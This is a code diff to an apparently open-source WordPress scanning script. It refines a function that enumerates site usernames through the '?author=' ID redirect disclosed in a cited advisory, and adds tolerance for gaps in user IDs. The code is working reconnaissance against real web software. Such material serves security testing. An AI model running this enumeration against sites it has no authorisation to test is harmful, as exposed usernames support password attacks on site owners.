@@ -98,21 +98,23 @@ def find_username(url, proxy):
         username = username.strip().replace("/","")
         return username
 
-def enumerate_usernames(base_url, proxy):
+def enumerate_usernames(base_url, gap_tolerance=0, proxy=None):
     """
     Enumerate usernames using TALSOFT-2011-0526 advisory (http://seclists.org/fulldisclosure/2011/May/493) present in WordPress > 3.2-beta2
     """
-    uid = 1
+    uid = 0
     usernames = []
+    gaps = 0
     title_cache = ""
     redirect = False
     while True:
 	try:
+	    uid = uid + 1
 	    url = base_url.rstrip("/")+"/?author="+str(uid)
 	    request = urllib2.Request(url)
 	    request.add_header("User-agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1")
 	    if proxy:
-		proxy_handler = urllib2.ProxyHandler({'http': proxy})
+		proxy_handler = urllib2.ProxyHandler({"http": proxy})
 		opener = urllib2.build_opener(proxy_handler)
 	    else:
 		opener = urllib2.build_opener()
@@ -124,11 +126,11 @@ def enumerate_usernames(base_url, proxy):
 		# A redirect was made and the username is exposed
 		usernames.append(response_path.split("/")[-2])
 		redirect = True
-		uid = uid + 1
+		gaps = 0
 	    elif parsed_response_url.geturl() == url and redirect is False:
 		# There was no redirection but the user ID seems to exists so we will try to
 		# find the username as the first word in the title
-		title_search = re.search('<title>(.*)</title>', data, re.IGNORECASE)
+		title_search = re.search("<title>(.*)</title>", data, re.IGNORECASE)
 		if title_search:
 		    title =  title_search.group(1)
 		    # If the title is the same than the last user ID requested, there are no new users
@@ -137,11 +139,13 @@ def enumerate_usernames(base_url, proxy):
 		    else:
 			title_cache = title
 			usernames.append(title.split()[0])
-			uid = uid + 1
+			gaps = 0
 	    else:
 		break
 	except urllib2.HTTPError:
-	    break
+	    gaps = gaps + 1
+	    if gaps > gap_tolerance:
+		break
 
     return usernames
 
